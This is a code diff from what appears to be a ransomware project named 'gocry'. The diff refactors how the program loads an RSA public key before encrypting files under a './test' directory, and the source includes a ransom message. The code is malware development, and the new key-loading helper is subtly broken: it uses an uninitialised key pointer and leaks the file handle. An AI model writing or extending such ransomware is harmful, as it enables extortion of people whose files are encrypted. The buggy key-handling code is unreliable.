@@ -7,25 +7,22 @@
 #include <stdio.h>
 #include <string.h>
 
-#define CHUNK_SIZE 4096
+#define CHUNK_SIZE  4096
+#define RSA_KEY_LEN 2048
 
 const char *root_dir_path = "./test";
 const char *ransom_message = "You've been infected by gocry.\nAll your files are not encrypted\n";
 
-EVP_PKEY *ReadPrivKey_FromFile(char *filename, char *pass) {
+RSA *rsa_pubkey_from_file(char *filename) {
     FILE *fp = fopen(filename, "r");
-    EVP_PKEY *key = NULL;
-    PEM_read_PrivateKey(fp, &key, NULL, pass);
-    fclose(fp);
+    if (!fp) {
+        return NULL;
+    }
 
-    return key;
-}
-
-EVP_PKEY *ReadPubKey_FromFile(char *filename) {
-    FILE *fp = fopen(filename, "r");
-    EVP_PKEY *key = NULL;
-    PEM_read_PUBKEY(fp, &key, NULL, NULL);
-    fclose(fp);
+    RSA *key;
+    if (PEM_read_RSAPublicKey(fp, &key, NULL, NULL) == NULL) {
+        return NULL;
+    }
 
     return key;
 }
@@ -121,8 +118,10 @@ int main() {
         closedir(root_dir);
     }
 
-    RSA *pub_key;
-    if (PEM_read_RSAPublicKey(fopen("./public.pem", "r"), &pub_key, NULL, NULL) != 0) {
+    RSA *public_rsa_key = rsa_pubkey_from_file("./public.pem");
+    if (public_rsa_key == NULL) {
+        puts("error reading rsa key");
+        return 1;
     }
 
     unsigned char encryption_key[crypto_secretstream_xchacha20poly1305_KEYBYTES];
